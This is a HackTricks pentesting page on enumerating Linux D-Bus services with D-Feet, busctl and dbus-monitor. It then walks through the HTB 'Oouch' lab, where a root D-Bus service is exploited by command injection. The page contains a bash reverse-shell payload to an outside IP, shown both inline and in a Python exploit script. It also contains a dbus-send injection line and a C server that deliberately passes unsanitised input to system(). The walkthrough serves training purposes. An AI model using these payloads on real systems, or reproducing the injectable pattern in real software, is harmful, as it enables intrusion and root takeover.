# D-Bus Enumeration & Command Injection Privilege Escalation

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **GUI enumeration**

**(This enumeration info was taken from** [**https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/**](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)**)**

Ubuntu desktop utilizes D-Bus as its inter-process communications (IPC) mediator. On Ubuntu, there are several message buses that run concurrently: A system bus, which is mainly used by **privileged services to expose system-wide relevant services**, and one session bus for each logged in user, which exposes services that are only relevant to that specific user. Since we will try to elevate our privileges, we will mainly focus on the system bus as the services there tend to run with higher privileges (i.e. root). Note that the D-Bus architecture utilizes one ‘router’ per session bus, which redirects client messages to the relevant services they are trying to interact with. Clients need to specify the address of the service to which they want to send messages.

Each service is defined by the **objects** and **interfaces** that it exposes. We can think of objects as instances of classes in standard OOP languages. Each unique instance is identified by its **object path** – a string which resembles a file system path that uniquely identifies each object that the service exposes. A standard interface that will help with our research is the **org.freedesktop.DBus.Introspectable** interface. It contains a single method, Introspect, which returns an XML representation of the methods, signals and properties supported by the object. This blog post focuses on methods and ignores properties and signals.

I used two tools to communicate with the D-Bus interface: CLI tool named **gdbus**, which allows to easily call D-Bus exposed methods in scripts, and [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), a Python based GUI tool that helps to enumerate the available services on each bus and to see which objects each service contains.

```bash
sudo apt-get install d-feet
```

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

_Figure 1. D-Feet main window_

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

_Figure 2. D-Feet interface window_

On the left pane in Figure 1 you can see all the various services that have registered with the D-Bus daemon system bus (note the select System Bus button on the top). I selected the **org.debin.apt** service, and D-Feet automatically **queried the service for all the available objects**. Once I selected a specific object, the set of all interfaces, with their respective methods properties and signals are listed, as seen in Figure 2. Note that we also get the signature of each **IPC exposed method**.

We can also see the **pid of the process** that hosts each service, as well as its **command line**. This is a very useful feature, since we can validate that the target service we are inspecting indeed runs with higher privileges. Some services on the System bus don’t run as root, and thus are less interesting to research.

D-Feet also allows one to call the various methods. In the method input screen we can specify a list of Python expressions, delimited by commas, to be interpreted as the parameters to the invoked function, shown in Figure 3. Python types are marshaled to D-Bus types and passed to the service.

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-23.png)

_Figure 3. Calling D-Bus Methods through D-Feet_

Some methods require authentication before allowing us to invoke them. We will ignore these methods, since our goal is to elevate our privileges without credentials in the first place.

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-24.png)

_Figure 4. A method that requires authorization_

Also note that some of the services query another D-Bus service named org.freedeskto.PolicyKit1 whether a user should be allowed to perform certain actions or not.

## **Cmd line Enumeration**

### List Service Objects

It's possible to list opened D-Bus interfaces with:

```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                - 
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service - 
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       - 
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    - 
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    - 
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… - 
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         - 
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         - 
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    - 
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    - 
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       - 
org.bluez                                - -               -                (activatable) -                         - 
org.freedesktop.DBus                     1 systemd         root             -             init.scope                - 
org.freedesktop.PackageKit               - -               -                (activatable) -                         - 
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         - 
org.freedesktop.hostname1                - -               -                (activatable) -                         - 
org.freedesktop.locale1                  - -               -                (activatable) -                         - 
```

#### Connections

When a process sets up a connection to a bus, the bus assigns to the connection a special bus name called _unique connection name_. Bus names of this type are immutable—it's guaranteed they won't change as long as the connection exists—and, more importantly, they can't be reused during the bus lifetime. This means that no other connection to that bus will ever have assigned such unique connection name, even if the same process closes down the connection to the bus and creates a new one. Unique connection names are easily recognizable because they start with the—otherwise forbidden—colon character.

### Service Object Info

Then, you can obtain some information about the interface with:

```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search 
        cap_fowner cap_fsetid cap_kill cap_setgid 
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service 
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock 
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot 
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot 
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config 
        cap_mknod cap_lease cap_audit_write cap_audit_control 
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog 
        cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search 
        cap_fowner cap_fsetid cap_kill cap_setgid 
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service 
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock 
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot 
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot 
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config 
        cap_mknod cap_lease cap_audit_write cap_audit_control 
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog 
        cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search 
        cap_fowner cap_fsetid cap_kill cap_setgid 
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service 
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock 
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot 
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot 
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config 
        cap_mknod cap_lease cap_audit_write cap_audit_control 
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog 
        cap_wake_alarm cap_block_suspend cap_audit_read
```

### List Interfaces of a Service Object

You need to have enough permissions.

```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```

### Introspect Interface of a Service Object

Note how in this example it was selected the latest interface discovered using the `tree` parameter (_see previous section_):

```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```

Note the method `.Block` of the interface `htb.oouch.Block` (the one we are interested in). The "s" of the other columns may mean that it's expecting a string.

### Monitor/Capture Interface

With enough privileges (just `send_destination` and `receive_sender` privileges aren't enough) you can **monitor a D-Bus communication**.

In order to **monitor** a **communication** you will need to be **root.** If you still find problems being root check [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) and [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
If you know how to configure a D-Bus config file to **allow non root users to sniff** the communication please **contact me**!
{% endhint %}

Different ways to monitor:

```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```

In the following example the interface `htb.oouch.Block` is monitored and **the message "**_**lalalalal**_**" is sent through miscommunication**:

```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```

You can use `capture` instead of `monitor` to save the results in a pcap file.

#### Filtering all the noise <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

If there is just too much information on the bus, pass a match rule like so:

```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```

Multiple rules can be specified. If a message matches _any_ of the rules, the message will be printed. Like so:

```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```

See the [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) for more information on match rule syntax.

### More

`busctl` have even more options, [**find all of them here**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Vulnerable Scenario**

As user **qtc inside the host "oouch" from HTB** you can find an **unexpected D-Bus config file** located in _/etc/dbus-1/system.d/htb.oouch.Block.conf_:

```markup
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```

Note from the previous configuration that **you will need to be the user `root` or `www-data` to send and receive information** via this D-BUS communication.

As user **qtc** inside the docker container **aeb4525789d8** you can find some dbus related code in the file _/code/oouch/routes.py._ This is the interesting code:

```python
if primitive_xss.search(form.textfield.data):
            bus = dbus.SystemBus()
            block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
            block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

            client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)  
            response = block_iface.Block(client_ip)
            bus.close()
            return render_template('hacker.html', title='Hacker')
```

As you can see, it is **connecting to a D-Bus interface** and sending to the **"Block" function** the "client\_ip".

In the other side of the D-Bus connection there is some C compiled binary running. This code is **listening** in the D-Bus connection **for IP address and is calling iptables via `system` function** to block the given IP address.\
**The call to `system` is vulnerable on purpose to command injection**, so a payload like the following one will create a reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

At the end of this page you can find the **complete C code of the D-Bus application**. Inside of it you can find between the lines 91-97 **how the `D-Bus object path`** **and `interface name`** are **registered**. This information will be necessary to send information to the D-Bus connection:

```c
        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
```

Also, in line 57 you can find that **the only method registered** for this D-Bus communication is called `Block`(_**Thats why in the following section the payloads are going to be sent to the service object `htb.oouch.Block`, the interface `/htb/oouch/Block` and the method name `Block`**_):

```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```

#### Python

The following python code will send the payload to the D-Bus connection to the `Block` method via `block_iface.Block(runme)` (_note that it was extracted from the previous chunk of code_):

```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```

#### busctl and dbus-send

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```

* `dbus-send` is a tool used to send message to “Message Bus”
* Message Bus – A software used by systems to make communications between applications easily. It’s related to Message Queue (messages are ordered in sequence) but in Message Bus the messages are sending in a subscription model and also very quick.
* “-system” tag is used to mention that it is a system message, not a session message (by default).
* “–print-reply” tag is used to print our message appropriately and receives any replies in a human-readable format.
* “–dest=Dbus-Interface-Block” The address of the Dbus interface.
* “–string:” – Type of message we like to send to the interface. There are several formats of sending messages like double, bytes, booleans, int, objpath. Out of this, the “object path” is useful when we want to send a path of a file to the Dbus interface. We can use a special file (FIFO) in this case to pass a command to interface in the name of a file. “string:;” – This is to call the object path again where we place of FIFO reverse shell file/command.

_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._

### C code

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
        char* host = NULL;
        int r;

        /* Read the parameters */
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
                return r;
        }

        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

        int command_len = strlen(command);
        int host_len = strlen(host);

        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
        if(command_buffer == NULL) {
                fprintf(stderr, "Failed to allocate memory\n");
                return -1;
        }

        sprintf(command_buffer, command, host);

        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang 
         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
         * multithreading)
         */
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occured. We simply send a genric message. 
             * In the first implementation we returned separate error messages for success or failure.
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
        SD_BUS_VTABLE_START(0),
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
        SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
        /*
         * Main method, registeres the htb.oouch.Block service on the system dbus.
         *
         * Paramaters:
         *      argc            (int)             Number of arguments, not required
         *      argv[]          (char**)          Argument array, not required
         *
         * Returns:
         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
         *      as long as the user keeps it alive.
         */


        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
        signal(SIGCHLD,SIG_IGN);

        sd_bus_slot *slot = NULL;
        sd_bus *bus = NULL;
        int r;

        /* First we need to connect to the system bus. */
        r = sd_bus_open_system(&bus);
        if (r < 0) 
        {
                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
                goto finish;
        }

        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
        if (r < 0) {
                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
                goto finish;
        }

        /* Register the service name to find out object */
        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
        if (r < 0) {
                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
                goto finish;
        }

        /* Infinite loop to process the client requests */
        for (;;) {
                /* Process requests */
                r = sd_bus_process(bus, NULL);
                if (r < 0) {
                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
                        goto finish;
                }
                if (r > 0) /* we processed a request, try to process another one, right-away */
                        continue;

                /* Wait for the next request to process */
                r = sd_bus_wait(bus, (uint64_t) -1);
                if (r < 0) {
                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
                        goto finish;
                }
        }

finish:
        sd_bus_slot_unref(slot);
        sd_bus_unref(bus);

        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
